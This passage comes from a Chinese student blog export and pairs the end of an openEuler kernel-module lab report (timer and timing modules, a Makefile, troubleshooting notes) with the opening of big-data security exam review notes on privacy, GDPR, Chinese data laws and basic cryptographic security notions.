<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make</span><br><span class="line">insmod timer_example.ko</span><br><span class="line">dmesg | <span class="built_in">tail</span> -n 2</span><br><span class="line">dmesg -t | <span class="built_in">tail</span> -n 2</span><br><span class="line">dmesg -T | <span class="built_in">tail</span> -n 2</span><br><span class="line">rmmod timer_example</span><br><span class="line">dmesg -T | <span class="built_in">tail</span> -n 3</span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/100-timer-compile-run.png" alt="timer编译运行"></p>
<p>（3）结果分析</p>
<p>加载该内核模块10秒后打印“hello,world!”，因为定时器执行了定时操作。合理使用定时器，可以使工作在指定时间点上执行，我们只需要执行一些初始化工作，设置一个超时时间，指定超时发生后执行的函数，然后激活定时器就可以了。指定的函数在定时器到期时自动执行。</p>
<p>3.调用内核时钟接口，监控累加计算代码的运行时间</p>
<p>（1）创建sum_time.c和Makefile文件</p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/101-create-sum-time-files.png" alt="创建sum_time文件"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NUM 100000</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">tv</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> num)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">long</span> total = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= NUM; i++)</span><br><span class="line">        total = total + i;</span><br><span class="line">    printk(<span class="string">&quot;The sum of 1 to %d is: %ld\n&quot;</span>, NUM, total);</span><br><span class="line">    <span class="keyword">return</span> total;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">sum_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> start;</span><br><span class="line">    <span class="type">int</span> start_u;</span><br><span class="line">    <span class="type">int</span> end;</span><br><span class="line">    <span class="type">int</span> end_u;</span><br><span class="line">    <span class="type">long</span> time_cost;</span><br><span class="line">    <span class="type">long</span> s;</span><br><span class="line"></span><br><span class="line">    printk(<span class="string">&quot;Start sum_time module...\n&quot;</span>);</span><br><span class="line">    do_gettimeofday(&amp;tv);</span><br><span class="line">    start = (<span class="type">int</span>)tv.tv_sec;</span><br><span class="line">    start_u = (<span class="type">int</span>)tv.tv_usec;</span><br><span class="line">    printk(<span class="string">&quot;The start time is: %d s %d us \n&quot;</span>, start, start_u);</span><br><span class="line"></span><br><span class="line">    s = sum(NUM);</span><br><span class="line"></span><br><span class="line">    do_gettimeofday(&amp;tv);</span><br><span class="line">    end = (<span class="type">int</span>)tv.tv_sec;</span><br><span class="line">    end_u = (<span class="type">int</span>)tv.tv_usec;</span><br><span class="line">    printk(<span class="string">&quot;The end time is: %d s %d us \n&quot;</span>, end, end_u);</span><br><span class="line">    time_cost = (end - start) * <span class="number">1000000</span> + end_u - start_u;</span><br><span class="line">    printk(<span class="string">&quot;The cost time of sum from 1 to %d is: %ld us \n&quot;</span>, NUM, time_cost);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">sum_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;Exit sum_time module...\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(sum_init);</span><br><span class="line">module_exit(sum_exit);</span><br></pre></td></tr></table></figure>

<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ifneq</span> (<span class="variable">$(KERNELRELEASE)</span>,)</span><br><span class="line">    obj-m := sum_time.o</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    KERNELDIR ?=/usr/src/kernels/kernel-4.19.90-2405.5.0</span><br><span class="line">    PWD := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"><span class="section">default:</span></span><br><span class="line">    <span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDIR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>:clean</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">    -rm *.mod.c *.o *.order *.symvers *.ko</span><br></pre></td></tr></table></figure>

<p>（2）编译运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make</span><br><span class="line">insmod sum_time.ko</span><br><span class="line">dmesg | <span class="built_in">tail</span> -n 5</span><br><span class="line">rmmod sum_time</span><br><span class="line">dmesg | <span class="built_in">tail</span> -n 6</span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/102-sum-time-compile-run.png" alt="sum_time编译运行"></p>
<p>（3）结果分析：由程序运行结果可以看出，从1到100000的累加和所花时间是 3 us。</p>
<h3 id="问题及解决方案"><a href="#问题及解决方案" class="headerlink" title="问题及解决方案"></a>问题及解决方案</h3><p><strong>问题一：</strong>进行2.1操作系统安装时，进行可视化桌面配置清华源时，没有添加sudo或者切换到root用户，导致一直出现“E212: Can’t open file for writing”。</p>
<p><strong>解决方案：</strong>通过切换root用户或使用sudo命令成功解决，认识到系统文件修改需要管理员权限。</p>
<p><strong>问题二：</strong>进行2.2内核更新中，无法像主机一样复制剪切粘贴移动内核源码文件。</p>
<p><strong>解决方案：</strong>安装VMware Tools或使用命令行进行移动</p>
<p><strong>问题三：</strong>进行2.3内核模块编程部分，总是频繁出现报错。</p>
<p>（1）比如hello.c文件出现编译出错问题</p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/103-compilation-error-problem.png" alt="编译错误问题"></p>
<p>（2）输入make后会出现Mkefile 1:*** 遗漏分隔符(nu)。停止这种错误。</p>
<p><strong>解决方案：</strong>最后发现是hello,c代码出现了一些小的错误。Makefile文件中缺少制表符（Tab）​​或使用了错误的缩进方式，因为​Makefile要求命令必须以Tab开头，不能用空格。</p>
<p><strong>解决问题过程中的参考：</strong></p>
<p>1.解决桌面可视化问题：<a href="https://zhuanlan.zhihu.com/p/229861153">https://zhuanlan.zhihu.com/p/229861153</a></p>
<p>2.<a href="https://blog.csdn.net/qq_46744173/article/details/122199462">OpenEuler实验_本次实验服务器已完成内核编译(openeuler 4.19.08),可直接开始实验-CSDN博客</a></p>
<p><strong>本实验代码参考：</strong><a href="https://gitee.com/lin-man/open-euler_sh">LM&#x2F;OpenEuler_实验</a></p>
<h3 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h3><p>通过这次实验，我收获了很多实用的知识和经验。在动手安装openEuler系统的过程中，我学会了如何正确配置和使用这个操作系统。从下载镜像到完成安装，再到创建个性化的用户账号，每一个步骤都让我对系统有了更直观的认识。</p>
<p>在实验中，我不仅成功编译了最新版本的内核，还通过实际操作深入了解了系统是如何进行编程，以及管理内存和时间的。这些经历让我对计算机系统的工作原理有了更清晰的理解，也让我掌握了更多实用的技术。这些知识和技能，不仅对现在的学习很有帮助，也为我以后的工作打下了很好的基础。</p>
]]></content>
      <categories>
        <category>第4学期实验</category>
        <category>操作系统实验</category>
      </categories>
      <tags>
        <tag>北邮</tag>
        <tag>实验</tag>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>大数据安全期末复习</title>
    <url>/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>授课：石瑞生</p>
<h1 id="绪论"><a href="#绪论" class="headerlink" title="绪论"></a>绪论</h1><h2 id="什么是大数据？（P1）"><a href="#什么是大数据？（P1）" class="headerlink" title="什么是大数据？（P1）"></a>什么是大数据？（P1）</h2><p><strong>（1）多样性(variety)：数据类型复杂。</strong>大数据不仅有传统数据库管理的结构化数据，还有各种非结构化、半结构化数据。例如，网页、图片、视频，等等。对于非结构化、半结构化数据的处理，需要引入传统关系型数据库技术之外的新的数据处理技术。</p>
<p><strong>（2）高速性(velocity)：不仅数据量大，而且数据产生的速度快，对数据的实时处理能力提出了非常高的要求。</strong>例如，微博数据，不仅数量大，而且时效性高。如果按照传统的搜索引擎的模式去处理，花上几天甚至几周时间去做数据采集、建立索引，这些数据由于对时效性要求高（例如，新闻事件，应急事件，等），传统的数据处理方法在这种场景下不再有效。</p>
<p><strong>（3）大规模(volume)：数据量大。超出常规数据库工具的处理能力。例如，搜索引擎。</strong>最早的大数据服务系统就是搜索引擎系统，它需要采集互联网上所有的网页并为其建立索引、对全球几十亿用户提供实时的网页搜索服务。面对这么大规模的数据集，传统的信息技术无能为力。谷歌公司为了应对大数据的挑战，设计了MapReduce计算模式、GFS分布式文件系统、BigTable数据管理系统，成为云计算技术的先驱。</p>
<p><strong>（4）Veracity准确性：数据质量参差不齐。</strong>网上的大量无标注数据、人为错误数据；物联网采集的正常数据中混杂着由于设备故障、环境原因、精度原因造成的错误数据。劣质信息的挑战，包括数据采集系统（例如，传感器网络）本身的质量问题，社交媒体上的谣言，电子商务网站上的水军，等等。</p>
<p><strong>（5）提取价值（Value）：从数据中发现价值，在应用中创造价值。</strong>大数据，数量虽然大，然而价值密度不见得高。类似于长尾效应，需要有效的技术才能够从价值密度低的大量数据中，以可以接受的成本，创造出价值。而且，判断一个数据集是否有价值也是很困难的事情：今天也许认为没有价值的数据，将来也许会找到很大的价值。</p>
<h2 id="什么是大数据安全？（P5）"><a href="#什么是大数据安全？（P5）" class="headerlink" title="什么是大数据安全？（P5）"></a>什么是大数据安全？（P5）</h2><p><strong>大数据安全是针对大数据服务系统，从系统架构与认证授权、计算与存储、算法设计与数据采集等多个角度来分析数据在采集与传输、存储与管理、流转与使用中的安全问题及解决方案。</strong></p>
<p>涉及两个方面：<strong>大数据服务中安全问题，大数据技术在安全领域的应用（考过填空细节）。</strong></p>
<h2 id="隐私权概念的发展经历了哪些主要变化？（课件，P6）"><a href="#隐私权概念的发展经历了哪些主要变化？（课件，P6）" class="headerlink" title="隐私权概念的发展经历了哪些主要变化？（课件，P6）"></a>隐私权概念的发展经历了哪些主要变化？（课件，P6）</h2><p>（1）起源：</p>
<p>隐私权的概念在人类发展中的首次出现：1890年，隐私权概念的提出</p>
<p>隐私权第一次写入法律：1902年，纽约，“面粉店与少妇”事件</p>
<p>20世纪60-70年代：关于隐私权的法律在欧美国家得到了充分发展。1974年，水门事件导致尼克松总统辞职；1974年，《隐私法》。</p>
<p>（2）发展：最早意义上的隐私权，<strong>集中在以住宅为代表的物理空间之上的</strong>。隐私权意味着一个人可以在自己的城堡中不受监督、不受干涉地发展自己的个性，决定自己的生活方式。随着技术的发展，隐私权的保护也在发生深刻的变化，其重心不断转移，<strong>经历了从住宅到人、再到信息的转变。</strong></p>
<p><strong>隐私是个人、机构等实体不愿意被外部世界知晓的敏感信息。</strong>其实不仅仅是这些我们直接管理的数据，还有很多不为我们所控制的数据。<strong>各种元数据：</strong>从“窃听”变为“监视”；例如：通话记录，而不是通话内容；电子邮件的收发行为（谁在什么时间给谁发送了邮件），而不是电子邮件的内容。<strong>各种行为数据</strong>：从网络空间到物理空间</p>
<h2 id="技术进步与隐私保护的关系（课件，P7）"><a href="#技术进步与隐私保护的关系（课件，P7）" class="headerlink" title="技术进步与隐私保护的关系（课件，P7）"></a>技术进步与隐私保护的关系（课件，P7）</h2><p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image.png" alt="image.png"></p>
<p>互联网开启了人类隐私的潘多拉之盒；”全民公敌”讲国家侵害个人私隐的主题，是人人关心的题材；2013年的棱镜门，是全球网络安全的转折点。</p>
<h2 id="为什么说斯诺登事件是全球网络安全的转折点？有哪几类可能侵犯大众隐私的敌手？（课件）"><a href="#为什么说斯诺登事件是全球网络安全的转折点？有哪几类可能侵犯大众隐私的敌手？（课件）" class="headerlink" title="为什么说斯诺登事件是全球网络安全的转折点？有哪几类可能侵犯大众隐私的敌手？（课件）"></a>为什么说斯诺登事件是全球网络安全的转折点？有哪几类可能侵犯大众隐私的敌手？（课件）</h2><p>（1）斯诺登泄密事件是整个互联网历史和治理辩论的<strong>分水岭</strong>，它较为<strong>彻底地击碎了自从互联网诞生以来许多神话，从根本上改变了全球公众此前对于互联网的认识。</strong>它首先表明，<strong>网络空间仍然可以是一种中心化的等级体制，美国国家安全局这种代表政府的国家权力与谷歌这种代表资本的经济权力可以巧妙结合、为祸世界。</strong>世界上最大的「老大哥」(Big Brother)和全球市值最高的互联网巨头可以互相喂食，像水蛭一样附着在信息技术食物链的最上层，从全球用户的有机体上汲取「营养」。斯诺登的揭露，Dual EC是NSA颠覆标准的系统努力的一部分。NSA向RSA支付了“1000万美元的交易，将[Dual EC]设置为BSafe软件中首选或默认的随机数生成方法。”</p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%201.png" alt="image.png"></p>
<p><strong>（2）侵犯隐私的敌手：</strong></p>
<p><strong>政府：</strong>公共安全；国际政治。国家级敌手。2013年7月，斯诺登事件，美国的“棱镜计划”：数据与元数据</p>
<p><strong>企业</strong>：经济利益。苹果，谷歌，BAT，等互联网公司</p>
<p><strong>黑客及一些犯罪组织</strong>：黑产。勒索软件，电信诈骗，谣言攻击&#x2F;舆论战等。</p>
<p>网络空间的黑色产业链。系统漏洞，被明码标价；入侵工具，像武器一样容易购买；水军，花钱就能够发起内容攻击。云计算技术，使得普通人的攻击能力日益增强，无须精通技术，也能发起网络攻击。</p>
<h2 id="GDPR的要点（欧盟《通用数据保护条例》）（P11）"><a href="#GDPR的要点（欧盟《通用数据保护条例》）（P11）" class="headerlink" title="GDPR的要点（欧盟《通用数据保护条例》）（P11）"></a>GDPR的要点（欧盟《通用数据保护条例》）（P11）</h2><p>规定针对从欧盟公民处收集数据的企业：<strong>强制企业遵循Privacy by Design原则。</strong></p>
<p><strong>数据转移权：</strong>该规定声明，<strong>用户可要求自己的个人数据畅通无阻地直接迁移至新的提供商，数据以机器可读的格式迁移。</strong>当用户不再使用该公司产品时，它们将会丢失大量数据。</p>
<p><strong>被遗忘权：每个数据主体有权要求数据控制者删除个人数据。</strong>（2014年5月13日欧盟法院就“被遗忘权”（RTBF）一案作出裁定，判决谷歌应根据用户请求删除不充足的，无关紧要的，不相关的数据，以保证数据不出现在搜索结果中。–RTBF于2014年5月生效后便引发了有关搜索引擎运营商如何权衡并最终解决除名请求的重大问题。在大数据时代，加强对用户个人权利的尊重才是时势所趋的潮流。）</p>
<p><strong>算法公平性：数据主体有权要求对算法自动决策给出解释。</strong>例如，如果贷款申请人被自动决策拒绝时，有权寻求解释。对于技术公司而言，这是对人工智能的严重限制，将大幅减缓AI技术的发展。</p>
<p>对于欧盟公民来说，GDPR增加技术公司在收集用户数据时的责任，从而保护了公民权利。</p>
<h2 id="在数据安全与隐私保护领域，我国相关的法律法规有哪些？（三驾马车，P15）"><a href="#在数据安全与隐私保护领域，我国相关的法律法规有哪些？（三驾马车，P15）" class="headerlink" title="在数据安全与隐私保护领域，我国相关的法律法规有哪些？（三驾马车，P15）"></a>在数据安全与隐私保护领域，我国相关的法律法规有哪些？（三驾马车，P15）</h2><p><strong>（1）《个人信息安全规范》</strong>：2018年1月，由全国信息安全标准化技术委员会组织制订的国家标准。尽管这是一部推荐性的国家标准，不具有强制力，但仍引起了学界与实务界的广泛关注。<strong>一是在《网络安全法》和“两高司法解释”的基础上，明确了个人信息处理活动中各项术语的定义，</strong>例如“个人信息控制者、收集、明示同意、用户画像、个人信息安全影响评估、删除、去标识化”等。<strong>二是对个人信息收集、保存、使用、转让和披露、通用安全各个环节，提出了非常明确具体的要求。</strong></p>
<p><strong>（2）数据安全法：</strong>自2021年9月1日起施行。将个人、企业和公共机构的数据安全纳入保障体系，确立了对数据领域的全方位监管、治理和保护，<strong>既约束了数据的非法采集和滥用，又保护了数据提供方和民众的信息使用，推动以数据开放、数据保护、数据流动等为基础的数据规则进一步完善。</strong>《数据安全法》中给出了“数据安全”的定义，<strong>为“通过采取必要措施，确保数据处于有效保护和合法利用状态，以及具备保障持续安全状态的能力。</strong>数据处理”则定义为“包括收集、存储、使用、加工、传输、提供、公开等”7个环节。</p>
<p><strong>（3）个人信息保护法</strong>。 定于2021年11月1日起正式施行。这是我国首部针对个人信息保护的专门性立法，也是网络安全法治建设的重要立法。<strong>2020年被称之为我国个人信息保护立法元年。</strong>规<strong>定个人信息是以电子或者其他方式记录的与已识别或者可识别的自然人有关的各种信息；</strong>个人信息的处理包括个人信息的收集、存储、使用、加工、传输、提供、公开等活动。确立了个人信息处理应遵循的原则，强调处理个人信息应当采用合法、正当的方式，具有明确、合理的目的，限于实现处理目的的最小范围，公开处理规则，保证信息准确，采取安全保护措施等，并将上述原则贯穿于个人信息处理的全过程、各环节。</p>
<h2 id="我国的数据资源跨境流通政策（课件）"><a href="#我国的数据资源跨境流通政策（课件）" class="headerlink" title="我国的数据资源跨境流通政策（课件）"></a>我国的数据资源跨境流通政策（课件）</h2><p><strong>（1）数据资源开发利用和安全保护是数字经济时代的一个核心话题。</strong>数据资源，特别是关键基础设施领域中积累的数据资源，具有重大战略意义。因此，在数字经济时代，数据资源的跨境流通就成为了一个数字贸易中“压舱石”级别的话题。<strong>对于政府而言，数字经济时代的社会治理有了全新的范畴。</strong>数据资源作为一种战略资源，如何有效开发利用，如何防范风险，是需要政府不断探索的内容。</p>
<p>（2）在跨境数字贸易当中，<strong>数据资源本地化</strong>以及<strong>数据资源跨境自由流通</strong>两种不同的政策曾经引发了广泛的辩论。在实践过程当中，选择了中间路线：<strong>在满足一定数据资源本地化要求以及审核的条件下，支持数据资源的跨境流通。</strong></p>
<h2 id="隐私和安全之间的关系（习题）"><a href="#隐私和安全之间的关系（习题）" class="headerlink" title="隐私和安全之间的关系（习题）"></a>隐私和安全之间的关系（习题）</h2><p>安全：<strong>聚焦数据资产的保密性、完整性、可用性（CIA三要素），</strong>防范未授权访问、篡改或破坏。</p>
<p>隐私：<strong>侧重个人对自身数据的控制权，</strong>确保个人身份、行为等敏感信息不被非法收集、使用或泄露，核心是个人自主性保护。</p>
<p>安全能够保证信息的<strong>机密性</strong>，隐私则常常需要这种<strong>机密性</strong>。个人隐私的泄漏，可能会危害到个人数据安全。<strong>信息安全</strong>是聚焦于信息资产的安全工具和安全行为，<strong>隐私保护</strong>则是关注对<strong>个人信息的使用和保护。</strong></p>
<h2 id="个人数据安全与个人隐私之间的关系，举例说明。（习题）"><a href="#个人数据安全与个人隐私之间的关系，举例说明。（习题）" class="headerlink" title="个人数据安全与个人隐私之间的关系，举例说明。（习题）"></a>个人数据安全与个人隐私之间的关系，举例说明。（习题）</h2><p><strong>（1）数据安全是隐私保护的基础：通过加密、访问控制等技术手段</strong>保障个人数据不被泄露或滥用</p>
<p><strong>技术手段</strong>：<strong>加密技术</strong>、<strong>访问控制</strong>、<strong>网络安全防护</strong>等，都是为了筑起这道技术防线，防止数据被<strong>泄露、窃取、篡改或破坏</strong>。这些是隐私得以存在的基础设施。</p>
<p><strong>（2）隐私是数据安全的最终目标之一：</strong>数据安全措施（如匿名化）需服务于隐私保护，但隐私还涉及法律合规（如知情同意）。数据只能用于收集时声明的特定目的。只收集与处理目的直接相关的最少数据。确保个人在充分知情的前提下自愿授权。在目的达成后，个人有权要求删除其数据。</p>
<h2 id="个人隐私与国家安全之间的关系？为什么要保护个人隐私？（AI版答案）"><a href="#个人隐私与国家安全之间的关系？为什么要保护个人隐私？（AI版答案）" class="headerlink" title="个人隐私与国家安全之间的关系？为什么要保护个人隐私？（AI版答案）"></a>个人隐私与国家安全之间的关系？为什么要保护个人隐私？（AI版答案）</h2><p>（1）关系：个人隐私与国家安全之间是<strong>对立统一的辩证关系</strong>，需要在法治框架下寻求平衡。</p>
<p><strong>对立&#x2F;冲突关系</strong>：国家为防范、侦查恐怖主义、间谍活动等重大威胁，有时需要依法对特定对象进行监控和数据调取，这必然在一定限度内克减个人隐私权。</p>
<p><strong>统一&#x2F;依存关系</strong>：保护公民隐私是<strong>社会信任与稳定的基石</strong>，深厚的民众信任是国家长治久安的根本。防范<strong>大规模个人数据泄露</strong>（如全民生物信息）本身就是现代国家安全的重要内涵。</p>
<p><strong>平衡原则</strong>：二者的平衡必须遵循<strong>比例原则</strong>，即国家干预隐私的措施必须<strong>目的正当、手段必要、有法律明确授权和司法监督</strong>，避免权力滥用。</p>
<p>（2）为什么要保护：保护个人隐私具有多重根本性价值</p>
<p><strong>维护人的尊严与自由</strong>：隐私是个人人格独立、思想自由和自主发展的基础。没有隐私，人将处于持续被审视的状态，丧失内心自由和探索勇气。</p>
<p><strong>保障基本权利与民主社会</strong>：隐私是<strong>言论自由、结社自由</strong>等政治权利的前提。在无隐私的环境中，异见和批评会因恐惧而消亡，民主机制将失效。</p>
<p><strong>构建社会信任</strong>：隐私允许人们在不同的社会关系中（如家庭、朋友、医患）建立信任和亲密感，是社会健康运行的情感纽带。</p>
<p><strong>防范权力与商业滥用</strong>：保护隐私可以限制<strong>公权力的任意扩张</strong>和<strong>商业机构对个人的操纵与歧视</strong>（如大数据“杀熟”、基于个人敏感信息的差别定价）。</p>
<h1 id="基础知识：密码算法与工程实践"><a href="#基础知识：密码算法与工程实践" class="headerlink" title="基础知识：密码算法与工程实践"></a>基础知识：密码算法与工程实践</h1><h2 id="加密强度与密钥长度的关系：给定安全等级和加密算法，如何选择密钥长度（P31）"><a href="#加密强度与密钥长度的关系：给定安全等级和加密算法，如何选择密钥长度（P31）" class="headerlink" title="加密强度与密钥长度的关系：给定安全等级和加密算法，如何选择密钥长度（P31）"></a>加密强度与密钥长度的关系：给定安全等级和加密算法，如何选择密钥长度（P31）</h2><p><strong>（1）安全强度的选择通常是在128比特安全性和256比特安全性之间进行的，因为大多数标准加密算法和实现对于实现这两个安全强度都是可行的。确实也会有低于128比特的密码方案</strong>，比如是64比特的或80比特的，但这些方案通常都不够安全，不足以满足实际需要。然而，为了确保长期的安全性，您<strong>应该选择256比特的安全性或接近256比特的安全性</strong>。即使在最坏的情况下，256比特的安全方案在可预见的未来也不太可能被攻破。<strong>超过256比特的安全性其实超出了实际需求</strong>，但出于营销策略，也有超过256比特的安全强度。</p>
<p>（2）<strong>有时候低于128比特的安全强度也是合理的。</strong>例如，当您只需要短时间的安全性，并且是资源受限的场景，比如实现更高安全强度的成本将对系统的成本或可用性产生负面影响时。一个现实例子是付费电视系统，其中加密密钥是48比特或64比特的。这里的安全强度听起来很低，但也足够了，因为付费电视系统的密钥每5秒或10秒就刷新一次。</p>
<p>（3）在实际暴力攻击方面，<strong>192比特和256比特密钥之间没有有意义的区别</strong>，因为不可能就是不可能。”</p>
<h2 id="混合加密技术：KEM，DEM（P30）"><a href="#混合加密技术：KEM，DEM（P30）" class="headerlink" title="混合加密技术：KEM，DEM（P30）"></a>混合加密技术：KEM，DEM（P30）</h2><p>对称和非对称加密比较：对称加密的主要运算是位运算，速度快；非对称加密的计算较复杂，涉及难解问题。<strong>针对速度慢的性能问题，提出混合加密的思想。</strong>混合加密具有与非对称加密相同的接口，只是可加密的消息要大得多。有两种机制：</p>
<p><strong>（1）密钥封装机制（KEM）指用非对称加密算法加密对称密钥。</strong></p>
<p><strong>（2）数据封装机制（DEM）是指用对称密钥算法加密消息。</strong></p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/dad61d93f4f30ec39344d53550316b4.png" alt="dad61d93f4f30ec39344d53550316b4.png"></p>
<p>数字签名：原始RSA签名方法太慢，签名太大：引入Hash，让RSA数字签名又小又快！</p>
<p>数字签名包含2种算法：<strong>签名算法、验证算法。</strong>当使用数字签名时，应用程序<strong>要签名的是消息的哈希值</strong>，而不是消息本身。</p>
<h2 id="几个核心概念：攻击模型（Attack-Model）、安全目标（Security-Goal）、安全概念（security-notion，记为-GOAL-MODEL）"><a href="#几个核心概念：攻击模型（Attack-Model）、安全目标（Security-Goal）、安全概念（security-notion，记为-GOAL-MODEL）" class="headerlink" title="几个核心概念：攻击模型（Attack Model）、安全目标（Security Goal）、安全概念（security notion，记为 GOAL-MODEL）"></a>几个核心概念：攻击模型（Attack Model）、安全目标（Security Goal）、安全概念（security notion，记为 GOAL-MODEL）</h2><h2 id="3类攻击模型：黑盒模型，灰盒模型，白盒模型。（P34）"><a href="#3类攻击模型：黑盒模型，灰盒模型，白盒模型。（P34）" class="headerlink" title="3类攻击模型：黑盒模型，灰盒模型，白盒模型。（P34）"></a>3类攻击模型：黑盒模型，灰盒模型，白盒模型。（P34）</h2><p>黑盒模型：攻击者<strong>可以获取明文和密文（程序输入输出）</strong>，但观测不到算法运行时的内部数据。</p>
<p>灰盒模型：通过程序运行时泄露的物理信息<strong>可以实质性的部分或完全获取程序运行的内部数据。</strong></p>
<p>白盒模型：对设备终端<strong>拥有完全的控制能力</strong>，能够<strong>观测和更改程序运行时的内部数据。</strong></p>
<h2 id="5种黑盒攻击模型（COA，KPA，CPA，CCA，CCA2）（P35）"><a href="#5种黑盒攻击模型（COA，KPA，CPA，CCA，CCA2）（P35）" class="headerlink" title="5种黑盒攻击模型（COA，KPA，CPA，CCA，CCA2）（P35）"></a>5种黑盒攻击模型（COA，KPA，CPA，CCA，CCA2）（P35）</h2><p>关于黑盒模型，有多种模型的攻击者：（从弱到强）</p>
<p>（1）唯密文攻击（Ciphertext-Only Attackers，COA）</p>
<p>（2）已知明文攻击（Known-Plaintext Attackers，KPA）</p>
<p>（3）选择明文攻击（Chosen-Plaintext Attackers，CPA），<strong>可以对其选择的明文执行加密查询</strong>，并观察生成的密文</p>
<p>（4）选择密文攻击（Chosen-Ciphertext Attackers，CCA）<strong>可以执行加密查询和解密查询</strong></p>
<p>（5）自适应选择密文攻击CCA2，允许密码分析人员在选择密文攻击中<strong>边分析边询问</strong></p>
<p>我们考虑三种不同的攻击。按照增加强度的顺序分别是<strong>选择明文攻击(CPA)、非自适应选择密文攻击(CCA1)和自适应选择密文攻击(CCA2)。</strong>在CPA下，对手可以获得她选择的明文的密文。在公钥设置中，向攻击者提供公钥就足以捕获这些攻击。</p>
<p>CCA1下，<strong>攻击者除了获得公钥外，还可以访问解密功能的oracle。</strong>攻击者只能在获得挑战密文之前的一段时间内使用此解密功能。</p>
<p>CCA2下，由于Rackoff和Simon的存在，<strong>攻击者再次获得了解密功能的神谕(除了公钥)访问权</strong>，但这一次，<strong>攻击者甚至可以对获得挑战密文后选择的密文使用该解密功能，唯一的限制是攻击者不能要求y本身的解密。</strong>(这种攻击被称为自适应攻击，因为对解密oracle的查询可能依赖于挑战y）。作为CCA1&#x2F;CCA2缩写的助记符，请记住，数字越大，攻击越强。</p>
<h2 id="2类安全目标（不可区分性，不可塑性）、安全概念（P36）"><a href="#2类安全目标（不可区分性，不可塑性）、安全概念（P36）" class="headerlink" title="2类安全目标（不可区分性，不可塑性）、安全概念（P36）"></a>2类安全目标（不可区分性，不可塑性）、安全概念（P36）</h2><p>（1）安全目标：</p>
<p><strong>不可区分性（Indistinguishability，IND）</strong>是指<strong>对手无法从密文中获得关于相应明文的任何信息</strong>。密文应该与随机字符串没有区别。</p>
<p><strong>不可塑性（Non-malleability，NM）</strong>是指<strong>对手在获得挑战密文访问权限后，无法生成</strong>与挑战密文有意义相关的不同密文。</p>
<p><strong>一次一密系统是可塑的</strong></p>
<p>（2）安全概念：<strong>攻击模型和安全目标的结合</strong>。</p>
<p>IND-CPA，等价于<strong>语义安全</strong>。IND-CPA安全性要求，<strong>对同一明文加密两次，则加密系统必须返回不同的密文</strong>。实现IND-CPA安全性的一种方法是<strong>使用随机加密</strong>，随机化是IND-CPA的关键。使用随机加密时，<strong>密文必须比明文略长</strong>，以便每个明文都可以包含多个可能的密文。</p>
<p>INT-PTXT，<strong>明文完整性。</strong></p>
<p>（3）安全概念间的关系：</p>
<p><strong>IND-CCA蕴含着IND-CPA，而NM-CCA蕴含着NM-CPA，因为CPA攻击者可以做的事情，CCA攻击者也可以做。</strong>也就是说，如果无法通过执行选择的密文和选择的明文查询来攻破密码，那么您就不能仅通过执行选择的明文查询来攻破密码。</p>
